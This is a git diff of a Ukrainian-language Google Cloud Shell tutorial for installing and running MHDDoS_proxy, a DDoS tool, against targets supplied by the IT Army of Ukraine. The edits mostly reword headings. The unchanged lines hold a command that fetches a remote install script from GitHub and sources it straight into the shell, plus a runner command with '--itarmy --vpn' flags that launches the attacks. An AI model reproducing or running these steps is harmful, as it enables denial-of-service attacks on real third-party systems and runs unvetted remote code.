@@ -1,9 +1,8 @@
-
 #   Все буде Україна! 💙💛
 
-## Бажаю вам гарного дня!
+## Привіт друзі. Бажаю вам гарного дня!
 
-###  Запуск MHDDoS_proxy
+### **Встановлення та запуск застосунку MHDDoS_proxy
 
 - для початківців пропоную хоча б частково ознайомитись з  інструкцією 👉  [Як запустити «Death by 1000 needles» (db1000n) в Google Cloud Shell](https://telegra.ph/YAk-zapustiti-dvanadcyat-ekzemplyar%D1%96v-Death-by-1000-needles-db1000n-v-Google-Cloud-Shell-ne-vikoristovuyuchi-VPN-05-04)
 
@@ -15,10 +14,10 @@
 
 [![Open in Cloud Shell](https://telegra.ph/file/22b02a59993bd344b2bc9.png)](https://shell.cloud.google.com/cloudshell/open?shellonly=true&git_repo=https://github.com/patatakartata/Cloud_Shell_DDoS&tutorial=mhddos_proxy_tutorial.md)
 
-Щоб перейти до запуску **MHDDoS_proxy** натисніть **START**
+Щоб перейти до роботи з **MHDDoS_proxy** натисніть **START**
 
  ## Давайте почнемо
--  для запуска MHDDoS_proxy скопіюйте команду розташовану нижче та натисніть клавішу **ENTER** 
+-  щоб встановити MHDDoS_proxy скопіюйте команду розташовану нижче та натисніть клавішу **ENTER** 
 ```bash
 cd ~/ && source <(curl https://raw.githubusercontent.com/patatakartata/Cloud_Shell_DDoS/main/mhddos_proxy_install.sh)
 ```
@@ -39,6 +38,7 @@ cd ~/ && cd mhddos_proxy && ./runner.sh python3 -t 600 --itarmy --vpn
 ```bash
 htop
 ```
+Щоб ознайомитись з додатковою інформацією натисніть кнопку **NEXT**
 
 ## Пропоную для ознайомлення:
 
@@ -54,7 +54,7 @@ htop
  
 * офіційна сторінка   [⚡ It Army of Ukraine ⚡](https://itarmy.com.ua/)  має багато корисної інформації   
 
-##  **Все буде Україна! 💙💛**
+##  **Гуртом переможемо! 💙💛**
 
 <walkthrough-conclusion-trophy>
 </walkthrough-conclusion-trophy>
